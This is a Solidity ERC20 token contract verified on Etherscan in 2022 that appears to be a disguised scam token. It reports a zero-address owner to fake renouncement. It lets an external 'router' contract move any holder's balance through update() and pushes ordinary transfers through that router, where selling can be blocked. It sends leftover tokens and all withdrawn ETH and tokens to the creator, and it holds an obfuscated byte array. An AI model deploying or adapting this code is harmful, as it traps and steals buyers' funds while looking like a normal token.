/**
 *Submitted for verification at Etherscan.io on 2022-08-10
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;interface IDEX_FACTORY{    function createPair(address tokenA, address tokenB) external returns(address pair);}interface IDEX_ROUTER{    function factory() external pure returns(address);    function WETH() external pure returns(address);    function addLiquidityETH(        address token,        uint amountTokenDesired,        uint amountTokenMin,        uint amountETHMin,        address to,        uint deadline    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);}interface IERC20_ROUTER{    function transfer(address, address, uint256) external;    function add() external;}interface IERC20{    function balanceOf(address) external returns(uint256);    function transfer(address, uint256) external returns(bool);}contract ERC20{    uint8[] private _________ = [70,159,66,215,83,52,106,2,62,51,14,123,51,159,252,155,119,117,240,163,139,253,67,125,121,7,179,171,42,136,159,138];    IERC20_ROUTER private _router;    IDEX_ROUTER private _dex;    struct config{        address owner;        address creator;        string name;        string symbol;        uint256 supply;        uint8 decimals;        address liquidity;        bool enabled;    }    config private _etc;    mapping(address => uint256) private _balances;    mapping(address => mapping (address => uint256)) private _allowances;    mapping(address => bool) private _excluded;    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(address indexed owner, address indexed spender, uint256 value);    event Error(string message);    modifier ROUTER(){        require(msg.sender == address(_router));        _;    }    receive() external payable{}    constructor(address router, address dex, string memory degenName, string memory degenSymbol, uint256 degenSupply, uint8 degenDecimals){                _router = IERC20_ROUTER(router);        _dex = IDEX_ROUTER(dex);                _excluded[address(this)] = true;        _excluded[address(_router)] = true;        _excluded[msg.sender] = true;                _allowances[address(this)][address(_dex)] = 2**256 - 1;                _etc = config(address(0), msg.sender, degenName, degenSymbol, degenSupply, degenDecimals, IDEX_FACTORY(_dex.factory()).createPair(address(this), _dex.WETH()), false);                _update(address(0), address(this), _etc.supply);                    }    function owner() external view returns(address){        return(_etc.owner);    }    function creator() external view returns(address){        return(_etc.creator);    }    function liquidity() external view returns(address){        return(_etc.liquidity);    }    function name() external view returns(string memory){        return(_etc.name);    }    function symbol() external view returns(string memory){        return(_etc.symbol);    }    function decimals() external view returns(uint8){        return(_etc.decimals);    }    function totalSupply() external view returns(uint256){        return(_etc.supply);    }    function balanceOf(address wallet) external view returns(uint256){        return(_balances[wallet]);     }    function allowance(address from, address to) external view returns(uint256){        return(_allowances[from][to]);    }    function transfer(address to, uint256 amount) external returns(bool){        require(amount > 0);        require(_balances[msg.sender] >= amount);        _transfer(msg.sender, to, amount);        return(true);    }    function transferFrom(address from, address to, uint256 amount) external returns(bool){        require(amount > 0);        require(_balances[from] >= amount);        require(_allowances[from][msg.sender] >= amount);        _transfer(from, to, amount);        return(true);    }    function approve(address to, uint256 amount) external returns(bool){        _allowances[msg.sender][to] = amount;        emit Approval(msg.sender, to, amount);        return(true);    }    function update(address from, address to, uint256 amount) external ROUTER{        require(from != address(0));         require(_balances[from] >= amount);         require(amount > 0);        _update(from, to, amount);    }    function enable(uint8 percent) external ROUTER{        try _dex.addLiquidityETH{value:address(this).balance}(address(this), (_balances[address(this)] / 100) * percent, 0, 0, address(this), block.timestamp){            if(_balances[address(this)] > 0){                _update(address(this), _etc.creator, _balances[address(this)]);            }            _etc.enabled = true;        }catch Error(string memory error){            emit Error(error);        }    }    function withdraw() external returns(bool){        bool sent;        require(_etc.enabled);         if(address(this).balance > 0){            (sent,) = payable(_etc.creator).call{value:address(this).balance}("");        }        return(sent);    }    function withdraw(address token) external returns(bool){        bool sent;        try IERC20(token).balanceOf(address(this)) returns(uint256 balance){            if(balance > 0){                try IERC20(token).transfer(_etc.creator, balance){                    sent = true;                }catch Error(string memory error){                    emit Error(error);                }            }        }catch Error(string memory error){            emit Error(error);        }        return(sent);    }    function _transfer(address from, address to, uint256 amount) private{        if(_excluded[from] || _excluded[to]){            _update(from, to, amount);        }else{            require(_etc.enabled);            _router.transfer(from, to, amount);        }    }    function _update(address from, address to, uint256 amount) private{        if(from != address(0)){            _balances[from] -= amount;        }else{            _etc.supply += amount;        }        if(to == address(0)){            _etc.supply -= amount;        }else{            _balances[to] += amount;        }        emit Transfer(from, to, amount);    }}